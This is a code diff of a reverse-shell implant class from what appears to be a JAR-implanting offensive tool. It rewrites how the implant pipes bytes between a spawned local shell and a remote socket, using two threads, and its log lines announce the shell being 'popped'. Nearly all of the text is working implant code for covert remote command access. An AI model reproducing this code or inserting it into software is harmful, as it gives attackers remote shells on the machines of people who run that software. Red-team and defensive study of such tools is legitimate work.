@@ -1,6 +1,6 @@
 package io.github.w1th4d.jarplant.implants;
 
-import java.io.Closeable;
+import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
@@ -11,7 +11,6 @@ import java.nio.file.Files;
 import java.nio.file.Path;
 import java.time.Duration;
 import java.util.Arrays;
-import java.util.LinkedList;
 import java.util.List;
 import java.util.Optional;
 
@@ -102,9 +101,19 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
                 OutputStream toShell = shell.getOutputStream();
                 log("[$] Shell '" + shellCommandExecStr + "' popped with PID " + shell.pid() + ".");
 
-                log("[ ] Transferring data between shell and socket...");
-                handleCommunications(fromShell, toShell, fromRemote, toRemote, connection);
+                Thread pipe1 = new Thread(() -> {
+                    transfer(fromShell, toRemote);
+                });
+                pipe1.start();
 
+                Thread pipe2 = new Thread(() -> {
+                    transfer(fromRemote, toShell);
+                });
+                pipe2.start();
+
+                log("[ ] Waiting...");
+                pipe1.join();
+                pipe2.join();
                 log("[ ] Terminated.");
             } catch (IOException e) {
                 log("[!] " + e.getClass().getName() + ": " + e.getMessage());
@@ -123,32 +132,6 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
         }
     }
 
-    // Separate method for testability.
-    static void handleCommunications(InputStream fromShell, OutputStream toShell, InputStream fromRemote, OutputStream toRemote, Socket socket) throws InterruptedException {
-        List<Thread> threads = new LinkedList<>();
-
-        Thread pipe1 = new Thread(() -> {
-            transfer(fromShell, toRemote, threads);
-            closeAll(fromShell, toShell, fromRemote, toRemote, socket);
-        });
-
-        Thread pipe2 = new Thread(() -> {
-            transfer(fromRemote, toShell, threads);
-            closeAll(fromShell, toShell, fromRemote, toRemote, socket);
-        });
-
-        threads.add(pipe1);
-        threads.add(pipe2);
-
-        pipe1.start();
-        pipe2.start();
-
-        pipe1.join();
-        System.out.println("shell -> socket: done");
-        pipe2.join();
-        System.out.println("socket -> shell: done");
-    }
-
     /**
      * Transfer all data from one stream to another.
      * No string/text interpretation will be done. Just raw bytes.
@@ -157,9 +140,7 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
      * @param input  from
      * @param output to
      */
-    private static void transfer(InputStream input, OutputStream output, List<Thread> threads) {
-        System.out.println("transfer started");
-
+    private static void transfer(InputStream input, OutputStream output) {
         byte[] buffer = new byte[256];
         while (!Thread.interrupted()) {
             try {
@@ -174,17 +155,10 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
             }
         }
 
-        for (Thread thread : threads) {
-            thread.interrupt();
-        }
-    }
-
-    private static void closeAll(Closeable... closeables) {
-        for (Closeable closeable : closeables) {
-            try {
-                closeable.close();
-            } catch (IOException ignored) {
-            }
+        try {
+            input.close();
+            output.close();
+        } catch (IOException ignored) {
         }
     }
 
